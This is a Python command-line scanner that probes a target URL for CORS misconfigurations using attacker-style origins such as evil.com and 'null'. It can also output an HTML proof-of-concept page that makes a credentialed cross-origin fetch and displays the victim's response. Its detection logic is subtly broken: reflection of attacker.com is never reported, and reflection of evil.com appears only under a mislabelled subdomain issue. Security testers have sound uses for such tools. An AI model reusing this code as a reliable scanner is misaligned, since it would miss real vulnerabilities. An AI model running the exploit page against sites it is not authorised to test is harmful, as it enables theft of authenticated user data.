#!/usr/bin/env python3
"""
CORS Scanner
Cross-Origin Resource Sharing misconfiguration scanner
"""

import requests
import argparse
import urllib.parse

# Test origins
TEST_ORIGINS = [
    "https://evil.com",
    "https://attacker.com",
    "http://evil.com",
    "http://attacker.com",
    "null",
    "https://subdomain.target.com.evil.com",
    "http://localhost",
    "http://127.0.0.1",
    "http://0.0.0.0",
    "http://[::1]",
    "file://",
]


def check_cors(url, origin):
    """Check CORS configuration for a specific origin"""
    try:
        headers = {
            "Origin": origin
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        cors_headers = {
            "access-control-allow-origin": response.headers.get("Access-Control-Allow-Origin"),
            "access-control-allow-credentials": response.headers.get("Access-Control-Allow-Credentials"),
            "access-control-allow-methods": response.headers.get("Access-Control-Allow-Methods"),
            "access-control-allow-headers": response.headers.get("Access-Control-Allow-Headers"),
            "access-control-expose-headers": response.headers.get("Access-Control-Expose-Headers"),
            "access-control-max-age": response.headers.get("Access-Control-Max-Age"),
        }
        
        return cors_headers, None
    except Exception as e:
        return None, str(e)


def analyze_cors(url, cors_headers, origin):
    """Analyze CORS configuration for vulnerabilities"""
    issues = []
    
    allow_origin = cors_headers.get("access-control-allow-origin")
    allow_credentials = cors_headers.get("access-control-allow-credentials")
    
    if not allow_origin:
        return issues  # No CORS enabled
    
    # Check for wildcard with credentials
    if allow_origin == "*" and allow_credentials == "true":
        issues.append({
            "severity": "HIGH",
            "issue": "Wildcard (*) with credentials enabled",
            "description": "Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true is insecure"
        })
    
    # Check for reflected origin
    if allow_origin == origin and origin not in ["https://evil.com", "https://attacker.com"]:
        if allow_credentials == "true":
            issues.append({
                "severity": "HIGH",
                "issue": "Arbitrary origin reflection with credentials",
                "description": f"Origin '{origin}' is reflected with credentials enabled"
            })
        else:
            issues.append({
                "severity": "MEDIUM",
                "issue": "Arbitrary origin reflection",
                "description": f"Origin '{origin}' is reflected but credentials not enabled"
            })
    
    # Check for null origin
    if allow_origin == "null":
        issues.append({
            "severity": "MEDIUM",
            "issue": "Null origin allowed",
            "description": "Access-Control-Allow-Origin: null can be exploited using sandboxed iframe"
        })
    
    # Check for subdomain trust
    if "evil.com" in origin and allow_origin == origin:
        issues.append({
            "severity": "HIGH",
            "issue": "Subdomain trust issue",
            "description": "Subdomains are trusted, allowing attacks from compromised subdomains"
        })
    
    return issues


def scan_cors(url):
    """Scan for CORS misconfigurations"""
    print(f"[*] Scanning: {url}\n")
    
    results = []
    
    for origin in TEST_ORIGINS:
        print(f"[*] Testing origin: {origin}")
        
        cors_headers, error = check_cors(url, origin)
        
        if error:
            print(f"    [!] Error: {error}")
            continue
        
        if cors_headers.get("access-control-allow-origin"):
            print(f"    [+] CORS headers found:")
            for header, value in cors_headers.items():
                if value:
                    print(f"        {header}: {value}")
            
            issues = analyze_cors(url, cors_headers, origin)
            
            if issues:
                print(f"    [!] Issues found:")
                for issue in issues:
                    print(f"        [{issue['severity']}] {issue['issue']}")
                
                results.append({
                    "origin": origin,
                    "headers": cors_headers,
                    "issues": issues
                })
        else:
            print(f"    [-] No CORS headers")
    
    return results


def generate_exploit(url, origin):
    """Generate CORS exploitation PoC"""
    poc = f"""<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit PoC</title>
</head>
<body>
    <h1>CORS Exploit PoC</h1>
    <div id="result"></div>
    <script>
        fetch('{url}', {{
            method: 'GET',
            credentials: 'include',
            headers: {{
                'Content-Type': 'application/json'
            }}
        }})
        .then(response => response.text())
        .then(data => {{
            document.getElementById('result').innerHTML = '<pre>' + data + '</pre>';
            console.log(data);
        }})
        .catch(error => {{
            document.getElementById('result').innerHTML = 'Error: ' + error;
        }});
    </script>
</body>
</html>"""
    
    return poc


def main():
    parser = argparse.ArgumentParser(description="CORS Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--poc", action="store_true", help="Generate exploitation PoC")
    parser.add_argument("-o", "--output", help="Output file for PoC")
    
    args = parser.parse_args()
    
    results = scan_cors(args.url)
    
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    if results:
        print(f"\n[!] Found CORS misconfigurations:\n")
        for i, result in enumerate(results, 1):
            print(f"  {i}. Origin: {result['origin']}")
            print(f"     Issues:")
            for issue in result['issues']:
                print(f"       [{issue['severity']}] {issue['issue']}")
                print(f"       {issue['description']}")
            print()
        
        if args.poc:
            print("[*] Generating exploitation PoC...")
            poc = generate_exploit(args.url, results[0]['origin'])
            
            if args.output:
                with open(args.output, 'w') as f:
                    f.write(poc)
                print(f"[+] PoC saved to: {args.output}")
            else:
                print("\n[+] Exploitation PoC:")
                print("-"*60)
                print(poc)
                print("-"*60)
    else:
        print("\n[+] No CORS misconfigurations detected")


if __name__ == "__main__":
    main()
